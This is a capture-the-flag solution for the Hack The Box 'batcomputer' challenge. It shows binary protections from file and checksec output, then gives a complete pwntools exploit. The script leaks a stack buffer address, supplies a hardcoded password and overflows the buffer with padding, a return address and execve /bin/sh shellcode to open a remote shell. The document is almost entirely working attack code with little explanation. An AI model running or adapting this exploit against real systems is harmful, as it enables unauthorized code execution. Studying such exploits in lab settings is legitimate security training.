

```assembly
# file batcomputer | tr "," "\n" 
batcomputer: ELF 64-bit LSB pie executable
 x86-64
 version 1 (SYSV)
 dynamically linked
 interpreter /lib64/ld-linux-x86-64.so.2
 BuildID[sha1]=497abb33ba7b0370d501f173facc947759aa4e22
 for GNU/Linux 3.2.0
 stripped
```

```assembly
# checksec batcomputer           
[*] '/root/Downloads/hackthebox/challenge/batcomputer/batcomputer'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

![image](https://user-images.githubusercontent.com/63084488/140466459-32617dda-1208-423c-aa91-4c77843b1d31.png)

exploit
```python
#!/usr/bin/python3

from pwn import *

def main():
    context.log_level='DEBUG'
    context.update(arch='amd64', os='linux')
    p = remote('docker.hackthebox.eu',31132)
    log.info("lets solve")

    # leak address of my buffer
    p.recvuntil('>')
    p.sendline('1')

    leak_address = p.recvline().split()[-1]
    leak_address = int(leak_address,16)
    log.success(f'leak_address: {hex(leak_address)}')

    # send evil payload
    # payload + eip + shellcode

    padding = b'A' * 84

    shellcode  = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91"
    shellcode += b"\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
    shellcode += b"\x54\x5f\x99\x52\x57\x54\x5e\xb0"
    shellcode += b"\x3b\x0f\x05"

    buffer = flat (
            padding,
            p64(leak_address + 84+8),
            shellcode
            )

    p.recvuntil('>')
    p.send('2')
    p.recv()
    p.sendline('b4tp@$$w0rd!')
    p.recvline()
    p.send(buffer)

    # trigger buffer overflow
    p.recvline()
    p.sendline('3')

    p.interactive()

if __name__ == '__main__':
    main()
```
